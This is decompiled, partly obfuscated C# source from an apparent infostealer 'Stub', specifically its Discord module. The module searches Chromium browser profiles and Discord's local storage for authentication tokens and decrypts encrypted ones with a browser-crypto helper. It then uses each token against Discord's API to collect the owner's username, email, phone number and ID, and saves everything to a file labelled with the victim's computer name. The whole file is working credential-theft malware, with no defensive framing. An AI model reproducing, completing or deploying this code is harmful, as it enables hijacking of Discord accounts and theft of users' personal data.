using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;
using dg3ypDAonQcOidMs0w;
using Microsoft.CSharp.RuntimeBinder;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200002E RID: 46
	public class Discord
	{
		// Token: 0x060000DE RID: 222 RVA: 0x0000B028 File Offset: 0x00009228
		public static DataExtractionStructs.DiscordUserData[] GetInfo()
		{
			HashSet<string> hashSet = new HashSet<string>();
			foreach (string text in Paths.ChromiumBrowsers.Values)
			{
				if (Directory.Exists(text))
				{
					foreach (string text2 in ChromiumRecovery.GetProfiles(text))
					{
						string text3 = Path.Combine(text, text2, "Local Storage", "leveldb");
						if (Directory.Exists(text3))
						{
							string[] files = Directory.GetFiles(text3, "*.ldb", SearchOption.AllDirectories);
							foreach (string text4 in files)
							{
								string text5 = Utils.ForceReadFileString(text4, false);
								if (text5 != null)
								{
									text5 = Discord.RemoveNonPrintableCharacters(text5);
									Match match = Discord.BasicRegex.Match(text5);
									while (match.Success)
									{
										hashSet.Add(match.Value);
										match = match.NextMatch();
									}
									Match match2 = Discord.NewRegex.Match(text5);
									while (match2.Success)
									{
										hashSet.Add(match2.Value);
										match2 = match2.NextMatch();
									}
								}
							}
						}
					}
				}
			}
			foreach (string text6 in Paths.DiscordPaths)
			{
				BrowserCrypto browserCrypto = new BrowserCrypto(text6, null);
				string text7 = Path.Combine(text6, "Local Storage", "leveldb");
				if (Directory.Exists(text7))
				{
					string[] files2 = Directory.GetFiles(text7, "*.ldb", SearchOption.AllDirectories);
					foreach (string text8 in files2)
					{
						string text9 = Utils.ForceReadFileString(text8, false);
						if (text9 != null)
						{
							text9 = Discord.RemoveNonPrintableCharacters(text9);
							Match match3 = Discord.BasicRegex.Match(text9);
							while (match3.Success)
							{
								hashSet.Add(match3.Value);
								match3 = match3.NextMatch();
							}
							Match match4 = Discord.NewRegex.Match(text9);
							while (match4.Success)
							{
								hashSet.Add(match3.Value);
								match4 = match4.NextMatch();
							}
							if (browserCrypto.operational)
							{
								Match match5 = Discord.EncryptedRegex.Match(text9);
								while (match5.Success)
								{
									string text10 = browserCrypto.DecryptBase64(match5.Value.Substring("dQw4w9WgXcQ:".Length));
									if (text10 != null)
									{
										hashSet.Add(text10);
									}
									match5 = match5.NextMatch();
								}
							}
						}
					}
				}
			}
			List<DataExtractionStructs.DiscordUserData> list = new List<DataExtractionStructs.DiscordUserData>();
			using (WebClient webClient = new WebClient())
			{
				foreach (string text11 in hashSet)
				{
					DataExtractionStructs.DiscordUserData discordUserData;
					if (Discord.GetTokenUserData(text11, out discordUserData, webClient))
					{
						list.Add(discordUserData);
					}
				}
			}
			return list.ToArray();
		}

		// Token: 0x060000DF RID: 223 RVA: 0x0000B38C File Offset: 0x0000958C
		private static bool GetTokenUserData(string token, out DataExtractionStructs.DiscordUserData userData, WebClient client = null)
		{
			userData = default(DataExtractionStructs.DiscordUserData);
			bool flag;
			if (flag = client == null)
			{
				client = new WebClient();
			}
			client.Headers.Add("authorization", token);
			Counter.Discord = true;
			bool flag2 = false;
			try
			{
				string text = client.DownloadString("https://discord.com/api/v9/users/@me");
				JavaScriptSerializer javaScriptSerializer = new JavaScriptSerializer();
				object obj = javaScriptSerializer.Deserialize<object>(text);
				if (Discord.<>o__4.<>p__1 == null)
				{
					Discord.<>o__4.<>p__1 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(Discord)));
				}
				Func<CallSite, object, string> target = Discord.<>o__4.<>p__1.Target;
				CallSite <>p__ = Discord.<>o__4.<>p__1;
				if (Discord.<>o__4.<>p__0 == null)
				{
					Discord.<>o__4.<>p__0 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(Discord), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				string text2 = target(<>p__, Discord.<>o__4.<>p__0.Target(Discord.<>o__4.<>p__0, obj, "username"));
				if (Discord.<>o__4.<>p__3 == null)
				{
					Discord.<>o__4.<>p__3 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(Discord)));
				}
				Func<CallSite, object, string> target2 = Discord.<>o__4.<>p__3.Target;
				CallSite <>p__2 = Discord.<>o__4.<>p__3;
				if (Discord.<>o__4.<>p__2 == null)
				{
					Discord.<>o__4.<>p__2 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(Discord), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				string text3 = target2(<>p__2, Discord.<>o__4.<>p__2.Target(Discord.<>o__4.<>p__2, obj, "email"));
				if (Discord.<>o__4.<>p__5 == null)
				{
					Discord.<>o__4.<>p__5 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(Discord)));
				}
				Func<CallSite, object, string> target3 = Discord.<>o__4.<>p__5.Target;
				CallSite <>p__3 = Discord.<>o__4.<>p__5;
				if (Discord.<>o__4.<>p__4 == null)
				{
					Discord.<>o__4.<>p__4 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(Discord), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				string text4 = target3(<>p__3, Discord.<>o__4.<>p__4.Target(Discord.<>o__4.<>p__4, obj, "phone"));
				if (Discord.<>o__4.<>p__7 == null)
				{
					Discord.<>o__4.<>p__7 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(Discord)));
				}
				Func<CallSite, object, string> target4 = Discord.<>o__4.<>p__7.Target;
				CallSite <>p__4 = Discord.<>o__4.<>p__7;
				if (Discord.<>o__4.<>p__6 == null)
				{
					Discord.<>o__4.<>p__6 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(Discord), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				string text5 = target4(<>p__4, Discord.<>o__4.<>p__6.Target(Discord.<>o__4.<>p__6, obj, "id"));
				if (Discord.<>o__4.<>p__9 == null)
				{
					Discord.<>o__4.<>p__9 = CallSite<Func<CallSite, object, int>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(int), typeof(Discord)));
				}
				Func<CallSite, object, int> target5 = Discord.<>o__4.<>p__9.Target;
				CallSite <>p__5 = Discord.<>o__4.<>p__9;
				if (Discord.<>o__4.<>p__8 == null)
				{
					Discord.<>o__4.<>p__8 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(Discord), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				bool flag3 = target5(<>p__5, Discord.<>o__4.<>p__8.Target(Discord.<>o__4.<>p__8, obj, "flags")) > 0;
				userData = new DataExtractionStructs.DiscordUserData(token, text2, text3, text4, text5, flag3);
				flag2 = true;
			}
			catch
			{
			}
			client.Headers.Remove("authorization");
			if (flag)
			{
				client.Dispose();
			}
			return flag2;
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x0000B730 File Offset: 0x00009930
		private static string RemoveNonPrintableCharacters(string input)
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (char c in input)
			{
				if (Discord.IsPrintable(c))
				{
					stringBuilder.Append(c);
				}
			}
			return stringBuilder.ToString();
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x0000B778 File Offset: 0x00009978
		private static bool IsPrintable(char c)
		{
			return c >= ' ' && c <= '~';
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x0000B798 File Offset: 0x00009998
		public static void SaveRecoveredDiscordDetails()
		{
			try
			{
				DataExtractionStructs.DiscordUserData[] info = Discord.GetInfo();
				if (info == null || info.Length == 0)
				{
					Console.WriteLine("No Discord tokens or user data were recovered.");
				}
				else
				{
					string text = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
					string compname = SystemInfo.Compname;
					string text2 = Paths.InitWorkDir();
					string text3 = Path.Combine(text2, string.Concat(new string[] { "Discord_", compname, "_", text, ".txt" }));
					using (StreamWriter streamWriter = new StreamWriter(text3))
					{
						foreach (DataExtractionStructs.DiscordUserData discordUserData in info)
						{
							streamWriter.WriteLine(discordUserData.ToString());
							streamWriter.WriteLine(new string('-', 50));
						}
					}
					Console.WriteLine("Successfully saved recovered Discord details to: " + text3);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("An error occurred while recovering or saving Discord details: " + ex.Message);
			}
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Discord()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00003C32 File Offset: 0x00001E32
		static Discord()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			Discord.BasicRegex = new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", RegexOptions.Compiled);
			Discord.NewRegex = new Regex("mfa\\.[\\w-]{84}", RegexOptions.Compiled);
			Discord.EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
		}

		// Token: 0x040000E5 RID: 229
		private static Regex BasicRegex;

		// Token: 0x040000E6 RID: 230
		private static Regex NewRegex;

		// Token: 0x040000E7 RID: 231
		private static Regex EncryptedRegex;
	}
}
